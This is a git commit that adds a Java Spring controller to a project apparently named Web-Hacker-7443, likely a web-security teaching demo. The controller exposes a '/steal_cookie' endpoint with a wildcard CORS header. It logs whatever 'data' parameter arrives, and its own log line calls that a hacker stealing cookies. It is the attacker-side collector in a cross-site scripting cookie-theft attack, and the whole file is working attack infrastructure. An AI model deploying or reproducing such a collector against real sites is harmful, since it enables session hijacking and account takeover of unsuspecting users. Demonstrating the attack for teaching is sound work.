9c5705d4c3b926c7fe05c58e427d7567374fe5d5
vincenttuan <vincentjava@yahoo.com.tw>
2023-02-19 21:53:37 +0800

    hacker

---
+++ Web-Hacker-7443/src/main/java/com/example/demo/controller/HackerController.java
@@ -0,0 +1,18 @@
+package com.example.demo.controller;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.RestController;
+
+@RestController
+public class HackerController {
+	
+	@RequestMapping("/steal_cookie")
+	public String stealCookie(HttpServletRequest request, HttpServletResponse response) {
+		response.addHeader("Access-Control-Allow-Origin", "*"); 
+		System.out.println("Hacker 偷取 cookie: " + request.getParameter("data"));
+		return "";
+	}
+}
